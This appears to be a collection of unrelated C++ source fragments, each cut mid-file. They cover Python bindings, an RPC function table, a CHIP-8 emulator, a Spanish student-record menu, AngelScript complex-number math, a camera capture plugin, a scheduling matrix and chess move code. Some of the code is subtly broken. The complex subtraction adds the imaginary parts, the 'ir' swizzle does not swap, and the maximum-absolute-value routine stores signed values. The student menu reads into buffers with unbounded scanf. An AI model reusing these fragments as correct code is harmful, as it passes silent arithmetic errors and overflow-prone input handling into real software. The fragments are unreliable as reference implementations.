     .def( \"area\", &Flowy::Lobe::area )\n        .def( \"volume\", &Flowy::Lobe::volume )\n        .def( \"set_azimuthal_angle\", &Flowy::Lobe::set_azimuthal_angle )\n        .def( \"get_azimuthal_angle\", &Flowy::Lobe::get_azimuthal_angle )\n        .def( \"get_sin_azimuthal_angle\", &Flowy::Lobe::get_sin_azimuthal_angle )\n        .def( \"get_cos_azimuthal_angle\", &Flowy::Lobe::get_cos_azimuthal_angle )\n        .def( \"extent_xy\", &Flowy::Lobe::extent_xy )\n        .def( \"line_segment_intersects\", &Flowy::Lobe::line_segment_intersects )\n        .def( \"is_point_in_lobe\", &Flowy::Lobe::is_point_in_lobe )\n        .def( \"point_at_angle\", &Flowy::Lobe::point_at_angle )\n        .def( \"rasterize_perimeter\", &Flowy::Lobe::rasterize_perimeter );\n\n    py::class_<Flowy::LobeCells>( m, \"LobeCells\" )\n        .def( py::init<>() )\n        .def_readwrite( \"cells_intersecting\", &Flowy::LobeCells::cells",
    "\n#include <fibre/func_utils.hpp>\n#include <fibre/object_server.hpp>\n#include \"interfaces.hpp\"\n\nusing namespace fibre;\n\nconst Function* fibre::static_server_function_table[] = {\n    &SyncMemberWrapper<decltype(&fibre::Property<const uint32_t>::read), &fibre::Property<const uint32_t>::read>::instance,\n    &SyncMemberWrapper<decltype(&fibre::Property<uint32_t>::exchange), &fibre::Property<uint32_t>::exchange>::instance,\n    &SyncMemberWrapper<decltype(&fibre::Property<uint32_t>::read), &fibre::Property<uint32_t>::read>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1_SubobjIntf::subfunc), &TestIntf1_SubobjIntf::subfunc>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func00), &TestIntf1Intf::func00>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func01), &TestIntf1Intf::func01>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func02), &TestIntf1Intf::func02>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func10), &TestIntf1Intf::func10>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func11), &TestIntf1Intf::func11>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func12), &TestIntf1Intf::func12>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func20), &TestIntf1Intf::func20>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func21), &TestIntf1Intf::func21>::instance,\n    &SyncMemberWrapper<decltype(&TestIntf1Intf::func22), &TestIntf1Intf::func22>::instance,\n};\n\ntemplate<> ServerInterfaceId fibre::get_interface_id<TestIntf1Intf>() { return 0; };\ntemplate<> ServerInterfaceId fibre::get_interface_id<fibre::Property<const uint32_t>>() { return 1; };\ntemplate<> ServerInterfaceId fibre::get_interface_id<fibre::Property<uint32_t>>() { return 2; };\ntemplate<> ServerInterfaceId fibre::get_interface_id<TestIntf1_SubobjIntf>() { return 3; };\n\n// Must be defined by the application\nextern TestIntf1Intf* test_object_ptr;\n\nServerObjectDefinition fibre::static_server_object_table[] = {\n    make_obj(test_object_ptr),\n    make_obj(test_object_ptr->get_prop_uint32()),\n    make_obj(test_object_ptr->get_prop_uint32_rw()),\n    make_obj(test_object_ptr->get_subobj()),\n};\n\nsize_t fibre::n_static_server_functions = 13;\nsize_t fibre::n_static_server_objects = 4;",
    "#include <bitset>\n#include <cstdint>\n#include <cstdio>\n#include \"emulator.hpp\"\n#include <cstring>\n#include <random>\n#include <stdexcept>\n#include <thread>\n#include \"window.hpp\"\n#include <iostream>\n#include <format>\n#include <filesystem>\n#include \"event_handler.hpp\"\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_sdlrenderer2.h\"\n\nnamespace\n{\n    using namespace std::chrono_literals;\n    std::array<std::uint8_t, SPRITE_TABLE_SIZE> sprites = \n    {\n        0xF0, 0x90, 0x90, 0x90, 0xF0, // 0\n        0x20, 0x60, 0x20, 0x20, 0x70, // 1\n        0xF0, 0x10, 0xF0, 0x80, 0xF0, // 2\n        0xF0, 0x10, 0xF0, 0x10, 0xF0, // 3\n        0x90, 0x90, 0xF0, 0x10, 0x10, // 4\n        0xF0, 0x80, 0xF0, 0x10, 0xF0, // 5\n        0xF0, 0x80, 0xF0, 0x90, 0xF0, // 6\n        0xF0, 0x10, 0x20, 0x40, 0x40, // 7\n        0xF0, 0x90, 0xF0, 0x90, 0xF0, // 8\n        0xF0, 0x90, 0xF0, 0x10, 0xF0, // 9\n        0xF0, 0x90, 0xF0, 0x90, 0x90, // A\n        0xE0, 0x90, 0xE0, 0x90, 0xE0, // B\n        0xF0, 0x80, 0x80, 0x80, 0xF0, // C\n        0xE0, 0x90, 0x90, 0x90, 0xE0, // D\n        0xF0, 0x80, 0xF0, 0x80, 0xF0, // E\n        0xF0, 0x80, 0xF0, 0x80, 0x80  // F\n    };\n\n    void print (std::string&& str)\n    {\n        std::cout << str;\n    }\n    \n    void parse_roms(std::string path, std::vector<std::string>& vec)\n    {\n        auto files = std::filesystem::path(path);\n        for (const auto& entry : std::filesystem::directory_iterator(path))\n        {\n            std::string currentPath = entry.path().string();\n            if (currentPath.find(\"hires\") != currentPath.npos)\n                continue;\n            if (std::filesystem::status(entry).type() == std::filesystem::file_type::directory)\n                parse_roms(currentPath, vec);\n\n            if (currentPath.find(\".ch8\") != currentPath.npos)\n                vec.push_back(currentPath.substr(currentPath.find(\"/\")+1, currentPath.find(\".\")-currentPath.find(\"/\")-1));\n        }\n    }\n\n    std::size_t combo_box(const std::vector<std::string>& items)\n    {\n        static std::size_t item_current_idx = 0;\n        const std::string& combo_preview_value = items[item_current_idx];\n        ImGui::SetNextItemWidth(590); // fix (magic numbers are bad!!!!!!)\n        if (ImGui::BeginCombo(\"##\", combo_preview_value.c_str(), ImGuiComboFlags_PopupAlignLeft))\n        {\n            for (std::size_t n = 0; n < items.size(); n++)\n            {\n                const bool is_selected = (item_current_idx == n);\n                if (ImGui::Selectable(items[n].c_str(), is_selected))\n                    item_current_idx = n;\n\n                // Set the initial focus when opening the combo (scrolling + keyboard navigation focus)\n                if (is_selected)\n                    ImGui::SetItemDefaultFocus();\n            }\n            ImGui::EndCombo();\n        }\n        return item_current_idx;\n    }\n}\n\nCPU::CPU (std::string&& fileName)\n: pc (0x200)\n, window()\n, pause (false)\n, reset {false}\n{\n    V.fill(0);\n    stack.fill(0);\n    load_ROM(std::forward<std::string>(fileName));\n}\n\nvoid CPU::_0NNN()\n{\n    pc = nnn;\n}\n\nvoid CPU::_00E0()\n{\n    buffer.reset();\n}\n\nvoid CPU::_00EE()\n{\n    pc = stack[sp];\n    sp--;\n}\n\nvoid CPU::_1NNN()\n{\n    pc = nnn;\n}\n\nvoid CPU::_2NNN()\n{\n    stack[++sp] = pc;\n    pc = nnn;\n}\n\nvoid CPU::_3XNN()\n{\n    if (V[x] == nn)\n        pc += 2;\n}\n\nvoid CPU::_4XNN()\n{\n    if (V[x] != nn)\n        pc += 2;\n}\n\nvoid CPU::_5XY0()\n{\n    if (V[x] == V[y]) pc += 2;\n}\n\nvoid CPU::_6XNN()\n{\n    V[x] = nn;\n}\n\nvoid CPU::_7XNN()\n{\n    V[x] += nn;\n}\n\nvoid CPU::_8XY0()\n{\n    V[x] = V[y];\n}\n\nvoid CPU::_8XY1()\n{\n    V[x] |= V[y];\n    V[0xF] = 0;\n}\n\nvoid CPU::_8XY2()\n{\n    V[x] = V[x] & V[y];\n    V[0xF] = 0;\n}\n\nvoid CPU::_8XY3()\n{\n    V[x] ^= V[y];\n    V[0xF] = 0;\n\n}\n\nvoid CPU::_8XY4()\n{\n    bool cary = (V[x] + V[y]) > 0xFF ? 1 : 0;\n    V[x] += V[y];\n    V[0xF] = cary;\n}\n\nvoid CPU::_8XY5()\n{\n    bool carry = V[y] > V[x] ? 0 : 1;\n    V[x] -= V[y];\n    V[0xF] = carry;\n}\n\nvoid CPU::_8XY6()\n{\n    bool temp =  V[y] & 0x1;\n    V[x] = V[y] >> 1;\n    V[0xF] = temp;\n}\n\nvoid CPU::_8XY7()\n{\n    bool carry = V[x] > V[y] ? 0 : 1;\n    V[x] = V[y] - V[x];\n    V[0xF] = carry;\n}\n\nvoid CPU::_8XYE()\n{\n    bool temp = V[y] & 0x80;\n    V[x] = V[y] << 1;\n    V[0xF] = temp;\n}\n\nvoid CPU::_9XY0()\n{\n    if (V[x] != V[y]) pc += 2;\n}\n\nvoid CPU::_ANNN()\n{\n    I = nnn;\n}\n\nvoid CPU::_BNNN()\n{\n    pc = nnn + V[0];\n}\n\nvoid CPU::_CXNN()\n{\n    V[x] = random_byte() & nn;\n}\n\nvoid CPU::_DXYN() // draw\n{\n    std::uint8_t px = V[x] % BUFFER_WIDTH;\n    std::uint8_t py = V[y] % BUFFER_HEIGHT;\n    V[0xF] = 0;\n    for (std::uint8_t dy = 0; dy < n; dy++)\n    {\n        std::uint8_t ry = py + dy;\n        if (ry >= BUFFER_HEIGHT) break;\n        std::uint8_t loc = RAM[I+dy];\n        for (std::uint8_t dx = 0; dx < 8; dx++)\n        {\n            std::uint8_t rx = px + dx;\n            if (rx >= BUFFER_WIDTH) break;\n            bool pixel = (loc << dx) & 0x80;\n            std::size_t index = rx + BUFFER_WIDTH * ry;\n            V[0xF] = (pixel && buffer.t",
    "#include <iostream>\n#include \"variables.h\"\nusing namespace std;\n\n/*\nC - CREATE\nR - READ\nU - UPDATE\nD - DELETE\n*/\n\n\nvoid addReg();\nvoid showReg();\nvoid menu();\n\n//CREATE\nvoid addReg(){\n    cout << \"Datos del estudiante\\n\";\n    cout << \"CIF: \" ;\n    scanf(\" %[^\\n]\", people[pos].cif);\n    cout << \"NOMBRES: \";\n    scanf(\" %[^\\n]\", people[pos].name);\n    cout << \"APELLIDOS: \";\n    scanf(\" %[^\\n]\", people[pos].lastName);\n    cout << \"A\u00d1O: \";\n    scanf(\"%d\", & people[pos].year);\n    pos++;\n}\n\n//read\nvoid showReg(){\n    for(int i =0; i < pos; i++){\n        printf(\"Nombre: %s %s \\nA\u00f1o: %d\"\n        , people[i].name, people[i].lastName\n        , people[i].year);\n        cout << \"************************************\\n\";\n    }\n}\n\nvoid menu(){\n    int op=0;\n    do{\n        cout << \"1. Agregar \\n\";\n        cout << \"2. Mostrar \\n\";\n        cout << \"3. Salir \\n\";\n        cout << \"Opcion: \";\n        cin >> op;\n        switch(op){\n            case 1:\n                addReg();\n                system(\"pause\");\n                break;\n            case 2:\n                showReg();\n                system(\"pause\");\n                break;\n            case 3:\n                break;\n            default: \n                break;\n        }\n    }while(op!=3);\n}",
    "#include <assert.h>\n#include <string.h> // strstr\n#include <new> // new()\n#include <math.h>\n#include \"scriptmathcomplex.h\"\n\n#ifdef __BORLANDC__\n// C++Builder doesn't define a non-standard \"sqrtf\" function but rather an overload of \"sqrt\"\n// for float arguments.\ninline float sqrtf (float x) { return sqrt (x); }\n#endif\n\nBEGIN_AS_NAMESPACE\n\nComplex::Complex()\n{\n\tr = 0;\n\ti = 0;\n}\n\nComplex::Complex(const Complex &other)\n{\n\tr = other.r;\n\ti = other.i;\n}\n\nComplex::Complex(float _r, float _i)\n{\n\tr = _r;\n\ti = _i;\n}\n\nbool Complex::operator==(const Complex &o) const\n{\n\treturn (r == o.r) && (i == o.i);\n}\n\nbool Complex::operator!=(const Complex &o) const\n{\n\treturn !(*this == o);\n}\n\nComplex &Complex::operator=(const Complex &other)\n{\n\tr = other.r;\n\ti = other.i;\n\treturn *this;\n}\n\nComplex &Complex::operator+=(const Complex &other)\n{\n\tr += other.r;\n\ti += other.i;\n\treturn *this;\n}\n\nComplex &Complex::operator-=(const Complex &other)\n{\n\tr -= other.r;\n\ti -= other.i;\n\treturn *this;\n}\n\nComplex &Complex::operator*=(const Complex &other)\n{\n\t*this = *this * other;\n\treturn *this;\n}\n\nComplex &Complex::operator/=(const Complex &other)\n{\n\t*this = *this / other;\n\treturn *this;\n}\n\nfloat Complex::squaredLength() const\n{\n\treturn r*r + i*i;\n}\n\nfloat Complex::length() const\n{\n\treturn sqrtf(squaredLength());\n}\n\nComplex Complex::operator+(const Complex &other) const\n{\n\treturn Complex(r + other.r, i + other.i);\n}\n\nComplex Complex::operator-(const Complex &other) const\n{\n\treturn Complex(r - other.r, i + other.i);\n}\n\nComplex Complex::operator*(const Complex &other) const\n{\n\treturn Complex(r*other.r - i*other.i, r*other.i + i*other.r);\n}\n\nComplex Complex::operator/(const Complex &other) const\n{\n\tfloat squaredLen = other.squaredLength();\n\tif( squaredLen == 0 ) return Complex(0,0);\n\n\treturn Complex((r*other.r + i*other.i)/squaredLen, (i*other.r - r*other.i)/squaredLen);\n}\n\n//-----------------------\n// Swizzle operators\n//-----------------------\n\nComplex Complex::get_ri() const\n{\n\treturn *this;\n}\nComplex Complex::get_ir() const\n{\n\treturn Complex(r,i);\n}\nvoid Complex::set_ri(const Complex &o)\n{\n\t*this = o;\n}\nvoid Complex::set_ir(const Complex &o)\n{\n\tr = o.i;\n\ti = o.r;\n}\n\n//-----------------------\n// AngelScript functions\n//-----------------------\n\nstatic void ComplexDefaultConstructor(Complex *self)\n{\n\tnew(self) Complex();\n}\n\nstatic void ComplexCopyConstructor(const Complex &other, Complex *self)\n{\n\tnew(self) Complex(other);\n}\n\nstatic void ComplexConvConstructor(float r, Complex *self)\n{\n\tnew(self) Complex(r);\n}\n\nstatic void ComplexInitConstructor(float r, float i, Complex *self)\n{\n\tnew(self) Complex(r,i);\n}\n\nstatic void ComplexListConstructor(float *list, Complex *self)\n{\n\tnew(self) Complex(list[0], list[1]);\n}\n\n//--------------------------------\n// Registration\n//-------------------------------------\n\nstatic void RegisterScriptMathComplex_Native(asIScriptEngine *engine)\n{\n\tint r;\n\n\t// Register the type\n#if AS_CAN_USE_CPP11\n\t// With C++11 it is possible to use asGetTypeTraits to determine the correct flags to represent the C++ class, except for the asOBJ_APP_CLASS_ALLFLOATS\n\tr = engine->RegisterObjectType(\"complex\", sizeof(Complex), asOBJ_VALUE | asOBJ_POD | asGetTypeTraits<Complex>() | asOBJ_APP_CLASS_ALLFLOATS); assert( r >= 0 );\n#else\n\tr = engine->RegisterObjectType(\"complex\", sizeof(Complex), asOBJ_VALUE | asOBJ_POD | asOBJ_APP_CLASS_CAK | asOBJ_APP_CLASS_ALLFLOATS); assert( r >= 0 );\n#endif\n\n\t// Register the object properties\n\tr = engine->RegisterObjectProperty(\"complex\", \"float r\", asOFFSET(Complex, r)); assert( r >= 0 );\n\tr = engine->RegisterObjectProperty(\"complex\", \"float i\", asOFFSET(Complex, i)); assert( r >= 0 );\n\n\t// Register the constructors\n\tr = engine->RegisterObjectBehaviour(\"complex\", asBEHAVE_CONSTRUCT,      \"void f()\",                             asFUNCTION(ComplexDefaultConstructor), asCALL_CDECL_OBJLAST); assert( r >= 0 );\n\tr = engine->RegisterObjectBehaviour(\"complex\", asBEHAVE_CONSTRUCT,      \"void f(const complex &in)\",            asFUNCTION(ComplexCopyConstructor), asCALL_CDECL_OBJLAST); assert( r >= 0 );\n\tr = engine->RegisterObjectBehaviour(\"complex\", asBEHAVE_CONSTRUCT,      \"void f(float)\",                        asFUNCTION(ComplexConvConstructor), asCALL_CDECL_OBJLAST); assert( r >= 0 );\n\tr = engine->RegisterObjectBehaviour(\"complex\", asBEHAVE_CONSTRUCT,      \"void f(float, float)\",                 asFUNCTION(ComplexInitConstructor), asCALL_CDECL_OBJLAST); assert( r >= 0 );\n\tr = engine->RegisterObjectBehaviour(\"complex\", asBEHAVE_LIST_CONSTRUCT, \"void f(const int &in) {float, float}\", asFUNCTION(ComplexListConstructor), asCALL_CDECL_OBJLAST); assert( r >= 0 );\n\n\t// Register the operator overloads\n\tr = engine->RegisterObjectMethod(\"complex\", \"complex &opAddAssign(const complex &in)\", asMETHODPR(Complex, operator+=, (const Complex &), Complex&), asCALL_THISCALL); assert( r >= 0 );\n\tr = engine->RegisterObjectMethod(\"complex\", \"complex &opSubAssign(const complex &in)\", asMETHODPR(Complex, operator-=, (const Complex &), Complex",
    "/*\n * This file is part of ALVAR, A Library for Virtual and Augmented Reality.\n *\n * Copyright 2007-2012 VTT Technical Research Centre of Finland\n *\n * Contact: VTT Augmented Reality Team <alvar.info@vtt.fi>\n *          <http://www.vtt.fi/multimedia/alvar.html>\n *\n * ALVAR is free software; you can redistribute it and/or modify it under the\n * terms of the GNU Lesser General Public License as published by the Free\n * Software Foundation; either version 2.1 of the License, or (at your option)\n * any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License\n * for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with ALVAR; if not, see\n * <http://www.gnu.org/licenses/old-licenses/lgpl-2.1.html>.\n */\n\n#include \"CapturePluginPtgrey.h\"\n#include <../../FlyCapture2/include/Camera.h>\n#include <../../FlyCapture2/include/Image.h>\n#include <../../FlyCapture2/include/Error.h>\n#include <../../FlyCapture2/include/BusManager.h>\n\n#include <sstream>\n\nusing namespace std;\n\nnamespace alvar\n{\nnamespace plugins\n{\nCapturePtgrey::CapturePtgrey(const CaptureDevice captureDevice)\n  : Capture(captureDevice)\n  , mCamera(new FlyCapture2::Camera)\n  , mImage(new FlyCapture2::Image)\n  , mChannels(-1)\n  , mReturnFrame(NULL)\n{\n}\n\nCapturePtgrey::~CapturePtgrey()\n{\n  stop();\n  delete mCamera;\n  delete mImage;\n}\n\nbool CapturePtgrey::start()\n{\n  if (isCapturing())\n  {\n    return isCapturing();\n  }\n\n  stringstream id(captureDevice().id());\n  id.setf(ios_base::hex, ios_base::basefield);\n  id >> mGUID.value[0];\n  id.get();\n  id >> mGUID.value[1];\n  id.get();\n  id >> mGUID.value[2];\n  id.get();\n  id >> mGUID.value[3];\n\n  if (mCamera->Connect(&mGUID) != FlyCapture2::PGRERROR_OK)\n  {\n    return false;\n  }\n\n  FlyCapture2::VideoMode videoMode;\n  FlyCapture2::FrameRate frameRate;\n  if (mCamera->GetVideoModeAndFrameRate(&videoMode, &frameRate) !=\n      FlyCapture2::PGRERROR_OK)\n  {\n    return false;\n  }\n\n  if (videoMode == FlyCapture2::VIDEOMODE_640x480RGB)\n  {\n    mChannels = 3;\n    mXResolution = 640;\n    mYResolution = 480;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_640x480Y8)\n  {\n    mChannels = 1;\n    mXResolution = 640;\n    mYResolution = 480;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_800x600RGB)\n  {\n    mChannels = 3;\n    mXResolution = 800;\n    mYResolution = 600;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_800x600Y8)\n  {\n    mChannels = 1;\n    mXResolution = 800;\n    mYResolution = 600;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1024x768RGB)\n  {\n    mChannels = 3;\n    mXResolution = 1024;\n    mYResolution = 768;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1024x768Y8)\n  {\n    mChannels = 1;\n    mXResolution = 1024;\n    mYResolution = 768;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1280x960RGB)\n  {\n    mChannels = 3;\n    mXResolution = 1280;\n    mYResolution = 960;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1280x960Y8)\n  {\n    mChannels = 1;\n    mXResolution = 1280;\n    mYResolution = 960;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1600x1200RGB)\n  {\n    mChannels = 3;\n    mXResolution = 1600;\n    mYResolution = 1200;\n  }\n  else if (videoMode == FlyCapture2::VIDEOMODE_1600x1200Y8)\n  {\n    mChannels = 1;\n    mXResolution = 1600;\n    mYResolution = 1200;\n  }\n  else\n  {\n    return false;\n  }\n\n  mReturnFrame = cvCreateImage(cvSize(mXResolution, mYResolution), IPL_DEPTH_8U,\n                               mChannels);\n  if (mCamera->StartCapture() != FlyCapture2::PGRERROR_OK)\n  {\n    return false;\n  }\n  mIsCapturing = true;\n  return isCapturing();\n}\n\nvoid CapturePtgrey::stop()\n{\n  if (isCapturing())\n  {\n    mCamera->StopCapture();\n    cvReleaseImage(&mReturnFrame);\n  }\n}\n\nIplImage* CapturePtgrey::captureImage()\n{\n  if (!isCapturing())\n  {\n    return NULL;\n  }\n\n  if (mCamera->RetrieveBuffer(mImage) == FlyCapture2::PGRERROR_OK)\n  {\n    unsigned long length = mReturnFrame->widthStep * mYResolution;\n    memcpy(mReturnFrame->imageData, mImage->GetData(), length);\n  }\n  return mReturnFrame;\n}\n\nbool CapturePtgrey::showSettingsDialog()\n{\n  return false;\n}\n\nstring CapturePtgrey::SerializeId()\n{\n  return \"CapturePtgrey\";\n}\n\nbool CapturePtgrey::Serialize(Serialization* serialization)\n{\n  return false;\n}\n\nCapturePluginPtgrey::CapturePluginPtgrey(const string& captureType)\n  : CapturePlugin(captureType)\n{\n}\n\nCapturePluginPtgrey::~CapturePluginPtgrey()\n{\n}\n\nCapturePlugin::CaptureDeviceVector CapturePluginPtgrey::enumerateDevices()\n{\n  CaptureDeviceVector devices;\n\n  FlyCapture2::BusManager bus;\n  if (bus.RescanBus() != FlyCapture2::PGRERROR_OK)\n  {\n    return devices;\n  }\n\n  unsigned int numberCameras = 0;\n  bus.GetNumOfCameras(&numberCameras);\n\n  for (unsigned int i = 0; i < numberCameras; i++)\n  {\n    FlyCapture2::PGRGuid guid;\n    bus.GetCameraFromIndex(i, &guid);",
    "#include <iostream>\n#include <vector>\n\n#include \"../include/ConfigMatrix.h\"\n#include \"../include/Logger.h\"\n\nextern Logger* globalLogger;    // for logging\n\n\n\nConfigMatrix::ConfigMatrix\n//-----------------------------------------------------------------------------\n// constructor;\n//-----------------------------------------------------------------------------\n(\n    MyVector* numJobs,\n    MyVector* processingTimes,\n    MyVector* numMachines,\n    MyVector* speedValues,\n    double makespan\n)\n{   \n    m_configData = this->construct(numJobs, processingTimes, numMachines, speedValues, makespan);\n    m_numConfigRows = (UINT) m_configData.size();\n    m_numConfigCols = (UINT) m_configData[0].size();\n    for (UINT i = 0; i < m_numConfigRows; i++)\n    {\n        for (UINT j = 0; j < m_numConfigCols; j++)\n        {\n            cout << m_configData[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    globalLogger->log(\"Number of columns in the configuration matrix: \", m_numConfigCols, LogTypeInfo);\n    //cout << \"config marix columns = \" << m_numConfigCols << endl;\n}\n\nConfigMatrix::~ConfigMatrix\n//-----------------------------------------------------------------------------\n// destructor;\n//-----------------------------------------------------------------------------\n(\n)\n{\n    // nothing to do\n}\n\nint ConfigMatrix::get\n//-----------------------------------------------------------------------------\n// getter for the Element in Matrix[row][col]\n//-----------------------------------------------------------------------------\n(\n    int row,\n    int col\n)\n{\n    if (row < 0 || row >= this->getNumRows() || col < 0 || col >= this->getNumCols()) \n    {\n        globalLogger->log(\"index out of bounds (ConfigMatrix::get)\", LogTypeError);\n        //cout << \"index out of bounds (ConfigMatrix::get)\" << endl;        \n        return 0;\n    }\n    return m_configData[row][col];\n}\n\n\nvoid ConfigMatrix::set\n//-----------------------------------------------------------------------------\n// setter for the Element in Matrix[row][col]\n//-----------------------------------------------------------------------------\n(\n    int row,\n    int col,\n    int value\n)\n{\n    if (row >= 0 && row < this->getNumRows() && col >= 0 && col < this->getNumCols()) \n    {\n        m_configData[row][col] = value;\n    }\n    else \n    {\n        globalLogger->log(\"index out of bounds (ConfigMatrix::set)\", LogTypeError);\n        //cout << \"index out of bounds (ConfigMatrix::set)\" << endl;\n        // do nothing\n    }\n}\n\n\nint ConfigMatrix::getMaxAbsValue\n//-----------------------------------------------------------------------------\n// calculates the maximum absolut value of a given matrix\n//-----------------------------------------------------------------------------\n(\n)\n{\n    int maxAbsVal = 0;\n    for (int i = 0; i < this->getNumRows(); i++)\n    {\n        for (int j = 0; j < this->getNumCols(); j++)\n        {\n            int val = this->get(i, j);\n            if (std::abs(val) > maxAbsVal)\n            {\n                maxAbsVal = val;\n            }\n        }\n    }\n    return maxAbsVal;\n}\n\n\nvoid ConfigMatrix::generateVectors\n//-----------------------------------------------------------------------------\n// determine all feasible configurations\n//-----------------------------------------------------------------------------\n(\n    MATRIX& matrix,\n    VECTOR& currentVector,\n    UINT rowIndex,\n    double makespan,\n    MyVector* processingTimes,\n    UINT speed,\n    MATRIX& resultVectors,\n    UINT& numConfigs\n)\n{\n    if (rowIndex == matrix.size()) {\n        // add vector to result if total load <= makespan\n        double load = 0;\n        for (UINT i = 0; i < matrix.size(); i++)\n        {\n            load += currentVector[i] * (processingTimes->get(i) / (double)speed);\n        }\n        if (load <= makespan) {\n            resultVectors.push_back(currentVector);\n            numConfigs += 1;\n        }\n        return;\n    }\n\n    // use depth-first search to generate all possible configurations\n    for (unsigned int i = 0; i < matrix[rowIndex].size(); i++) {\n        currentVector.push_back(matrix[rowIndex][i]);\n        generateVectors(matrix, currentVector, rowIndex + 1, makespan, processingTimes, speed, resultVectors, numConfigs);\n        currentVector.pop_back();\n    }\n}\n\n\nMATRIX ConfigMatrix::transpose\n//-----------------------------------------------------------------------------\n// tranposes the given matrix\n//-----------------------------------------------------------------------------\n(\n    MATRIX* matrix\n)\n{\n    // define dimensions\n    UINT rows = (UINT) matrix->size();\n    UINT cols = (UINT) (*matrix)[0].size();\n\n    // iterate over all enties in the given matrix and save them in the correct positions of the result\n    MATRIX result(cols, VECTOR(rows));\n    for (UINT i = 0; i < rows; i++)\n    {\n        for (UINT j = 0; j < cols; j++)\n        {\n            result[j][i] = (*matrix)[i][j];\n        }\n    }\n    return result;\n}\n\n\n\nMATRIX ConfigMatrix::construct\n//----------------",
    "//move.cpp by Dan Honeycutt.  This software is public domain.\r\n//You may use this software as you wish.  There is no warranty.\r\n#include \"chess.h\"\r\n\r\n/*********************************************************************\r\nFile includes functions to make and unmake moves.\r\n*********************************************************************/\r\n\r\n//====================================================================\r\n//AddPiece() places a piece on the board\r\n//====================================================================\r\nvoid AddPiece(int c1, int b1) {\r\n  assert(board[b1]==ESQ);\r\n  bb_move = sq_set[b1];\r\n  board[b1] = c1;               //place on array board\r\n  bbd[c1] |= bb_move;           //place on piece bitboard\r\n  bbd[c1 & KTC] |= bb_move;     //place on all men bitboard\r\n  bb_rl90 |= sq_set_rl90[b1];   //place on the 3 rotated boards\r\n  bb_rl45 |= sq_set_rl45[b1];\r\n  bb_rr45 |= sq_set_rr45[b1];\r\n  key_1 ^= rnd_psq[c1][b1];     //update hash key\r\n  num_men[c1]++;                //update count of piece\r\n  num_men[c1 & KTC] += piece_value[c1];   //total material (B & W)\r\n  //simon doesn't use a pawn hash key but it maintains one for\r\n  //good measure.  You may find it useful.\r\n  if ((c1 & TYPE) == PAWN) key_2 ^= rnd_psq[c1][b1];\r\n  else {\r\n    num_men[(c1 & KTC) + BISH_Q]++;       //total pieces (B & W)\r\n    if (c1 & SLIDE) {                     //update sliding pieces\r\n      if ((c1 & SLIDE_B)==SLIDE_B) bbd[BISH_Q] |= bb_move;\r\n      if ((c1 & SLIDE_R)==SLIDE_R) bbd[ROOK_Q] |= bb_move;\r\n    }\r\n  }    \r\n} //AddPiece()\r\n\r\n//====================================================================\r\n//MovePiece() relocates a piece.\r\n//====================================================================\r\nvoid MovePiece(int c1, int b1, int b2) {\r\n  assert(board[b1]==c1 && board[b2]==ESQ);\r\n  bb_move = sq_set[b1] | sq_set[b2];\r\n  board[b1] = ESQ;\r\n  board[b2] = c1;\r\n  bbd[c1] ^= bb_move;\r\n  bbd[c1 & KTC] ^= bb_move;\r\n  bb_rl90 ^= sq_set_rl90[b1] | sq_set_rl90[b2];\r\n  bb_rl45 ^= sq_set_rl45[b1] | sq_set_rl45[b2];\r\n  bb_rr45 ^= sq_set_rr45[b1] | sq_set_rr45[b2];\r\n  key_1 ^= rnd_psq[c1][b1];\r\n  key_1 ^= rnd_psq[c1][b2];\r\n  if (c1 & SLIDE) {\r\n    if ((c1 & SLIDE_B)==SLIDE_B) bbd[BISH_Q] ^= bb_move;\r\n    if ((c1 & SLIDE_R)==SLIDE_R) bbd[ROOK_Q] ^= bb_move;\r\n  } else if ((c1 & TYPE) == PAWN) {\r\n    key_2 ^= rnd_psq[c1][b1];\r\n    key_2 ^= rnd_psq[c1][b2];\r\n  }\r\n} //MovePiece()\r\n\r\n//====================================================================\r\n//RemovePiece() removes a piece.\r\n//====================================================================\r\nvoid RemovePiece(int c1, int b2) {\r\n  assert((board[b2]==c1) && ((c1 & TYPE) != KING));\r\n  bb_move = sq_set[b2];\r\n  board[b2] = ESQ;\r\n  bbd[c1] ^= bb_move;\r\n  bbd[c1 & KTC] ^= bb_move;\r\n  bb_rl90 ^= sq_set_rl90[b2];\r\n  bb_rl45 ^= sq_set_rl45[b2];\r\n  bb_rr45 ^= sq_set_rr45[b2];\r\n  key_1 ^= rnd_psq[c1][b2];\r\n  num_men[c1]--;\r\n  num_men[c1 & KTC] -= piece_value[c1];\r\n  //piece specific\r\n  if ((c1 & TYPE) == PAWN) key_2 ^= rnd_psq[c1][b2];\r\n  else {\r\n    num_men[(c1 & KTC) + BISH_Q]--;   //piece count\r\n    if (c1 & SLIDE) {\r\n      if ((c1 & SLIDE_B)==SLIDE_B) bbd[BISH_Q] ^= bb_move;\r\n      if ((c1 & SLIDE_R)==SLIDE_R) bbd[ROOK_Q] ^= bb_move;    \r\n    }\r\n  }\r\n} //RemovePiece()\r\n  \r\n//====================================================================\r\n//Move() makes a move and updates position data.  It also updates\r\n//en passant square, castling status, game ply and hash keys.\r\n//====================================================================\r\nvoid Move(int move, int ply) {\r\n  int b1, b2, man, cap, temp;\r\n  castle[ply+1] = castle[ply];      //copy castling rights\r\n 